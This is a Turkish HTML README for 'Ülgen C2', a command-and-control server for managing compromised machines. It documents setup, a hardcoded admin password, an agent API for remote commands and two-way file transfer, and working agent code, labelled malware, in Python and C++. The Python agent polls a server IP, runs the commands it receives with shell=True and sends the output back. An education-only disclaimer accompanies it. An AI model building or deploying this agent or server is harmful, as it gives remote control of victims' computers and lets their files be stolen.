<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ülgen C2 - Komut Kontrol Sunucusu</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #0a0e1c;
            color: #e0e0e0;
            line-height: 1.6;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #14182b;
            border-radius: 15px;
            border: 1px solid #2a2f45;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        h1 {
            color: #00ff9d;
            font-size: 2.5em;
            margin-bottom: 10px;
            font-weight: 400;
            letter-spacing: 2px;
        }

        h2 {
            color: #00ff9d;
            font-size: 1.8em;
            margin: 40px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #2a2f45;
            font-weight: 400;
        }

        h3 {
            color: #00ff9d;
            font-size: 1.3em;
            margin: 30px 0 15px;
            font-weight: 400;
        }

        .badge-container {
            margin: 20px 0;
        }

        .badge {
            display: inline-block;
            padding: 5px 15px;
            background: #1e2338;
            border: 1px solid #2a2f45;
            border-radius: 20px;
            margin-right: 10px;
            font-size: 14px;
            color: #00ff9d;
        }

        .feature-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin: 30px 0;
        }

        .feature-card {
            background: #1e2338;
            border: 1px solid #2a2f45;
            border-radius: 10px;
            padding: 25px;
            transition: transform 0.3s, border-color 0.3s;
        }

        .feature-card:hover {
            transform: translateY(-5px);
            border-color: #00ff9d;
        }

        .feature-icon {
            font-size: 2em;
            margin-bottom: 15px;
            display: block;
        }

        .feature-card h4 {
            color: #00ff9d;
            font-size: 1.2em;
            margin-bottom: 15px;
            font-weight: 500;
        }

        .feature-card ul {
            list-style: none;
        }

        .feature-card li {
            margin-bottom: 10px;
            padding-left: 20px;
            position: relative;
        }

        .feature-card li::before {
            content: "•";
            color: #00ff9d;
            position: absolute;
            left: 0;
        }

        .code-block {
            background: #0a0e1c;
            border: 1px solid #2a2f45;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #00ff9d;
        }

        .command-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        .command-table th {
            background: #1e2338;
            color: #00ff9d;
            padding: 12px;
            text-align: left;
            font-weight: 500;
            border-bottom: 2px solid #2a2f45;
        }

        .command-table td {
            padding: 12px;
            border-bottom: 1px solid #2a2f45;
        }

        .command-table tr:hover {
            background: #1e2338;
        }

        .api-endpoint {
            background: #1e2338;
            border-left: 3px solid #00ff9d;
            padding: 15px;
            margin: 15px 0;
            border-radius: 0 8px 8px 0;
        }

        .api-endpoint .method {
            color: #00ff9d;
            font-weight: bold;
            margin-right: 10px;
        }

        .api-endpoint .path {
            font-family: 'Courier New', monospace;
            color: #fff;
        }

        .warning-box {
            background: #1e2338;
            border: 1px solid #ffaa00;
            border-left: 4px solid #ffaa00;
            padding: 20px;
            border-radius: 8px;
            margin: 30px 0;
        }

        .warning-box h4 {
            color: #ffaa00;
            margin-bottom: 10px;
        }

        .architecture-diagram {
            background: #0a0e1c;
            padding: 30px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            color: #00ff9d;
            text-align: center;
            margin: 30px 0;
            border: 1px solid #2a2f45;
        }

        .folder-structure {
            background: #0a0e1c;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            color: #e0e0e0;
            border: 1px solid #2a2f45;
        }

        .folder-structure .folder {
            color: #ffaa00;
        }

        .folder-structure .file {
            color: #e0e0e0;
        }

        .btn {
            display: inline-block;
            background: #00ff9d;
            color: #0a0e1c;
            padding: 10px 25px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: 600;
            margin: 10px 5px;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:hover {
            background: #00cc7a;
            box-shadow: 0 0 15px #00ff9d;
        }

        .btn-outline {
            background: transparent;
            border: 2px solid #00ff9d;
            color: #00ff9d;
        }

        .btn-outline:hover {
            background: #00ff9d;
            color: #0a0e1c;
        }

        hr {
            border: none;
            border-top: 1px solid #2a2f45;
            margin: 30px 0;
        }

        .footer {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #2a2f45;
            color: #888;
        }

        .footer a {
            color: #00ff9d;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 Ülgen C2 - Komut Kontrol Sunucusu</h1>
        
        <div class="badge-container">
            <span class="badge">version 2.0</span>
            <span class="badge">node 18+</span>
            <span class="badge">license MIT</span>
        </div>

        <p style="font-size: 1.2em; margin: 20px 0;">Ülgen C2, güvenlik testleri ve eğitim amaçlı geliştirilmiş, çift portlu bir Komut Kontrol (Command & Control) sunucusudur. Ajanları yönetmek, komut çalıştırmak ve dosya transferi yapmak için tasarlanmıştır.</p>

        <h2>📋 İçindekiler</h2>
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin: 20px 0;">
            <a href="#ozellikler" style="color: #00ff9d; text-decoration: none;">✨ Özellikler</a>
            <a href="#mimari" style="color: #00ff9d; text-decoration: none;">🏗️ Mimari Yapı</a>
            <a href="#kurulum" style="color: #00ff9d; text-decoration: none;">🚀 Kurulum</a>
            <a href="#kullanim" style="color: #00ff9d; text-decoration: none;">🎮 Kullanım</a>
            <a href="#api" style="color: #00ff9d; text-decoration: none;">📡 API</a>
            <a href="#ajan" style="color: #00ff9d; text-decoration: none;">🐍 Ajan Geliştirme</a>
            <a href="#guvenlik" style="color: #00ff9d; text-decoration: none;">⚠️ Güvenlik</a>
            <a href="#sss" style="color: #00ff9d; text-decoration: none;">❓ SSS</a>
        </div>

        <h2 id="ozellikler">✨ Özellikler</h2>
        
        <div class="feature-grid">
            <div class="feature-card">
                <span class="feature-icon">🔧</span>
                <h4>Temel Özellikler</h4>
                <ul>
                    <li><strong>Çift Port Mimarisi:</strong> 443 (ajan iletişimi) ve 9998 (yönetici paneli)</li>
                    <li><strong>HTTPS Tabanlı:</strong> Tüm iletişim SSL/TLS ile şifrelenir</li>
                    <li><strong>Çoklu Ajan Desteği:</strong> Aynı anda birden fazla ajanı yönetebilme</li>
                    <li><strong>Gerçek Zamanlı Güncelleme:</strong> Server-Sent Events ile anlık ajan takibi</li>
                </ul>
            </div>

            <div class="feature-card">
                <span class="feature-icon">📁</span>
                <h4>Dosya Yönetimi</h4>
                <ul>
                    <li><strong>Çift Yönlü Transfer:</strong> Ajan'dan sunucuya / sunucudan ajan'a dosya gönderme</li>
                    <li><strong>Base64 Encode:</strong> Büyük dosyalar için optimize edilmiş transfer</li>
                    <li><strong>Otomatik İndirme:</strong> Files sayfasında tek tıkla browser'a indirme</li>
                    <li><strong>Kalıcı Depolama:</strong> Sunucu restartında dosyalar kaybolmaz</li>
                </ul>
            </div>

            <div class="feature-card">
                <span class="feature-icon">🖥️</span>
                <h4>Yönetici Paneli</h4>
                <ul>
                    <li><strong>Modern Arayüz:</strong> Koyu tema, yeşil neon renkler</li>
                    <li><strong>Canlı Ajan Listesi:</strong> Bağlı ajanları anlık görüntüleme</li>
                    <li><strong>Komut Terminali:</strong> Ajanlara direkt komut gönderme</li>
                    <li><strong>Dizin Gezintisi:</strong> cd, ls, pwd komutları ile ajanın dosya sisteminde gezinme</li>
                </ul>
            </div>
        </div>

        <h2 id="mimari">🏗️ Mimari Yapı</h2>
        
        <div class="architecture-diagram">
            <pre style="margin: 0;">
┌─────────────────┐     443      ┌──────────────┐
│     Ajanlar     │ ◄─────────── │   C2 Sunucu  │
│  (Malware)      │              │  (Node.js)   │
└─────────────────┘              └──────┬───────┘
                                        │ 9998
                                   ┌────▼──────┐
                                   │ Yönetici  │
                                   │  Paneli   │
                                   └───────────┘
            </pre>
        </div>

        <h3>Port Yapısı</h3>
        <table class="command-table">
            <thead>
                <tr>
                    <th>Port</th>
                    <th>Kullanım</th>
                    <th>Açıklama</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>443</strong></td>
                    <td>Ajan API</td>
                    <td>Ajanların bağlandığı, komut alıp veri gönderdiği port</td>
                </tr>
                <tr>
                    <td><strong>9998</strong></td>
                    <td>Yönetici Paneli</td>
                    <td>Web arayüzü, ajan yönetimi ve dosya transferi</td>
                </tr>
            </tbody>
        </table>

        <h3>Klasör Yapısı</h3>
        <div class="folder-structure">
            <pre style="margin: 0;">
c2-server/
├── 📁 certs/                 # SSL sertifikaları
├── 📁 public/                 # Web arayüzü dosyaları
│   ├── 📄 login.html
│   ├── 📄 dashboard.html
│   └── 📄 files.html
├── 📁 uploads/                # Ajandan gelen dosyalar (kalıcı)
├── 📁 downloads/              # Ajana giden dosyalar (geçici)
├── 📄 server.js                # Ana sunucu kodu
├── 📄 package.json
└── 📄 README.md
            </pre>
        </div>

        <h2 id="kurulum">🚀 Kurulum</h2>
        
        <h3>Gereksinimler</h3>
        <ul style="margin-left: 20px;">
            <li>Node.js 18+</li>
            <li>npm veya yarn</li>
            <li>OpenSSL (sertifika oluşturmak için)</li>
            <li>sudo yetkisi (443 portu için)</li>
        </ul>

        <h3>Adım Adım Kurulum</h3>
        <div class="code-block">
# 1. Repoyu klonla
git clone https://github.com/Subutay-CyberSecurity/Ulgen-Control-And-Commad-Server.git
cd Ulgen-Control-And-Commad-Server

# 2. Bağımlılıkları yükle
npm install

# 3. SSL sertifikası oluştur
mkdir certs
cd certs
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
# Common Name'e sunucu IP'ni yaz (örn: 192.168.1.45)
cd ..

# 4. Klasörleri oluştur
mkdir uploads downloads

# 5. Sunucuyu başlat
sudo node server.js
        </div>

        <h3>Docker ile Kurulum (Opsiyonel)</h3>
        <div class="code-block">
# Dockerfile
FROM node:18
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 443 9998
CMD ["node", "server.js"]

# Build ve run
docker build -t ulgen-c2 .
docker run -p 443:443 -p 9998:9998 -v $(pwd)/uploads:/app/uploads ulgen-c2
        </div>

        <h2 id="kullanim">🎮 Kullanım</h2>
        
        <h3>Yönetici Paneli</h3>
        <ol style="margin-left: 20px;">
            <li>Tarayıcından <code>https://&lt;sunucu_ip&gt;:9998</code> adresine git</li>
            <li>Şifre: <code>mow0BEBWgooxBLCiAVTm</code></li>
            <li><strong>Dashboard:</strong> Ajanları görüntüle, komut gönder</li>
            <li><strong>Files:</strong> Transfer edilen dosyaları indir</li>
        </ol>

        <h3>Komut Gönderme</h3>
        <div class="code-block">
whoami              - Kullanıcı adını öğren
ipconfig/ifconfig   - IP bilgilerini al
ls -la              - Dosyaları listele
cd /home/user       - Dizin değiştir
pwd                 - Mevcut dizini göster
upload file.txt     - Dosyayı sunucuya gönder
download file_id    - Sunucudan dosya indir
info                - Sistem bilgilerini getir
help                - Yardım menüsü
        </div>

        <h3>Dosya Transferi</h3>
        
        <h4>📤 Ajan'a Dosya Gönderme (Admin → Ajan)</h4>
        <ol style="margin-left: 20px;">
            <li>Dashboard'da ajanı seç</li>
            <li>"DOSYA SEÇ" ile dosyayı seç</li>
            <li>"DOSYA GÖNDER" butonuna tıkla</li>
        </ol>

        <h4>📥 Ajandan Dosya Alma (Ajan → Admin)</h4>
        <ol style="margin-left: 20px;">
            <li>Dashboard'da ajanı seç</li>
            <li>"DOSYA YOLU" kısmına dosya yolunu yaz</li>
            <li>"DOSYA İSTE" butonuna tıkla</li>
            <li>Dosya otomatik browser'a iner</li>
        </ol>

        <h2 id="api">📡 API Dokümantasyonu</h2>

        <div class="api-endpoint">
            <span class="method">POST</span>
            <span class="path">/api/game/register</span>
            <p style="margin-top: 10px;">Ajan kaydı</p>
        </div>

        <div class="code-block">
{
    "playerId": "agent_pc_user_abc123",
    "playerName": "pc_user",
    "system_info": {
        "hostname": "victim-pc",
        "system": "Windows",
        "username": "user"
    }
}
        </div>

        <div class="api-endpoint">
            <span class="method">GET</span>
            <span class="path">/api/game/status/{agentId}</span>
            <p style="margin-top: 10px;">Komut kontrolü</p>
        </div>

        <div class="code-block">
{
    "success": true,
    "gameData": {
        "command": "whoami",
        "command_id": "cmd_123456789_abc123"
    }
}
        </div>

        <div class="api-endpoint">
            <span class="method">POST</span>
            <span class="path">/api/game/data</span>
            <p style="margin-top: 10px;">Komut çıktısı gönderme</p>
        </div>

        <div class="code-block">
{
    "playerId": "agent_...",
    "action": "command_output",
    "data": {
        "command_id": "cmd_...",
        "command": "whoami",
        "output": "root\n"
    }
}
        </div>

        <div class="api-endpoint">
            <span class="method">POST</span>
            <span class="path">/api/agent/upload</span>
            <p style="margin-top: 10px;">Dosya yükleme</p>
        </div>

        <div class="code-block">
{
    "agentId": "agent_...",
    "file": {
        "name": "file.txt",
        "size": 12345,
        "content": "base64_encoded_content"
    }
}
        </div>

        <div class="api-endpoint">
            <span class="method">GET</span>
            <span class="path">/api/files/{fileId}/download</span>
            <p style="margin-top: 10px;">Dosya indirme (binary)</p>
        </div>

        <h2 id="ajan">🐍 Ajan (Malware) Geliştirme</h2>

        <h3>Python Örneği</h3>
        <div class="code-block">
#!/usr/bin/env python3
import requests
import time
import subprocess
import platform
import uuid

SERVER = "https://192.168.1.45:443"
agent_id = f"agent_{platform.node()}_{uuid.uuid4().hex[:4]}"

# SSL uyarılarını kapat
import urllib3
urllib3.disable_warnings()

# Kayıt ol
requests.post(f"{SERVER}/api/game/register", 
              json={"playerId": agent_id},
              verify=False)

while True:
    # Komut kontrolü
    r = requests.get(f"{SERVER}/api/game/status/{agent_id}", verify=False)
    data = r.json().get('gameData', {})
    
    if 'command' in data:
        cmd = data['command']
        cmd_id = data['command_id']
        
        # Komut çalıştır
        result = subprocess.run(cmd, shell=True,
                               capture_output=True, text=True)
        
        # Sonuç gönder
        requests.post(f"{SERVER}/api/game/data", json={
            "playerId": agent_id,
            "action": "command_output",
            "data": {
                "command_id": cmd_id,
                "command": cmd,
                "output": result.stdout or result.stderr
            }
        }, verify=False)
    
    time.sleep(3)
        </div>

        <h3>C++ Örneği (libcurl ile)</h3>
        <div class="code-block">
#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;curl/curl.h&gt;
#include &lt;nlohmann/json.hpp&gt;

using json = nlohmann::json;
using namespace std;

int main() {
    CURL* curl = curl_easy_init();
    string agent_id = "agent_cpp_test";
    
    // Register
    string data = "{\"playerId\":\"" + agent_id + "\"}";
    curl_easy_setopt(curl, CURLOPT_URL, "https://192.168.1.45:443/api/game/register");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_perform(curl);
    
    while(true) {
        // Command check
        string url = "https://192.168.1.45:443/api/game/status/" + agent_id;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_perform(curl);
        
        Sleep(3000);
    }
}
        </div>

        <h2 id="guvenlik">⚠️ Güvenlik Uyarıları</h2>

        <div class="warning-box">
            <h4>🔒 Önemli Notlar</h4>
            <ul style="margin-left: 20px;">
                <li><strong>Bu araç sadece eğitim ve güvenlik testleri içindir</strong></li>
                <li>İzinsiz kullanımı yasa dışıdır</li>
                <li>Kendi ağınızda veya izinli sistemlerde test edin</li>
                <li>Varsayılan şifreyi değiştirin (PASSWORD sabiti)</li>
            </ul>
        </div>

        <h3>🔐 Güvenlik Önlemleri</h3>
        <div class="code-block">
// Varsayılan şifreyi değiştir
const PASSWORD = 'kendi_güçlü_şifren';

// SSL sertifikalarını güvende tut
chmod 600 certs/key.pem
        </div>

        <h3>📝 Production İpuçları</h3>
        <ul style="margin-left: 20px;">
            <li>Güçlü bir SSL sertifikası kullanın (Let's Encrypt)</li>
            <li>Rate limiting ekleyin</li>
            <li>İzleme ve loglama yapın</li>
            <li>Düzenli yedekleme alın</li>
            <li>Güvenlik duvarında sadece gerekli portları açın</li>
        </ul>

        <h2 id="sss">❓ Sık Sorulan Sorular</h2>

        <div style="margin: 20px 0;">
            <p><strong>Sunucu başlamıyor, "EACCES" hatası alıyorum?</strong></p>
            <div class="code-block">
sudo node server.js
            </div>

            <p><strong>Dosyalar gözükmüyor, restart'ta sıfırlanıyor?</strong></p>
            <div class="code-block">
# Uploads klasörünü kontrol et
ls -la uploads/
# Dosyalar varsa, server.js'de scanUploadsFolder() çalışıyor mu kontrol et
            </div>

            <p><strong>Ajan bağlanamıyor, SSL hatası alıyorum?</strong></p>
            <div class="code-block">
requests.get(url, verify=False)
            </div>

            <p><strong>Performance için öneriler?</strong></p>
            <ul style="margin-left: 20px;">
                <li>CHECK_INTERVAL = 3 (çok sık kontrol etmeyin)</li>
                <li>Dosya limiti: 500mb (çok büyük dosyalar sorun çıkarır)</li>
                <li>Heartbeat: 60 saniye (trafiği azaltır)</li>
            </ul>
        </div>

        <h2>🤝 Katkıda Bulunma</h2>
        <ol style="margin-left: 20px;">
            <li>Fork'la</li>
            <li>Feature branch oluştur (<code>git checkout -b yeni-ozellik</code>)</li>
            <li>Değişiklikleri commit et (<code>git commit -am 'Yeni özellik eklendi'</code>)</li>
            <li>Branch'i pushla (<code>git push origin yeni-ozellik</code>)</li>
            <li>Pull Request aç</li>
        </ol>

        <hr>

        <div class="footer">
            <p>
                <strong>📞 İletişim:</strong> 
                <a href="https://github.com/Subutay-CyberSecurity" target="_blank">@Subutay-CyberSecurity</a>
            </p>
            <p>
                <strong>📜 Lisans:</strong> Bu proje MIT lisansı ile lisanslanmıştır.
            </p>
            <p style="margin-top: 20px; font-size: 0.9em; color: #666;">
                Not: Bu yazılım sadece eğitim amaçlıdır. Kötüye kullanımı yasal sorumluluk doğurur.
            </p>
        </div>
    </div>
</body>
</html>
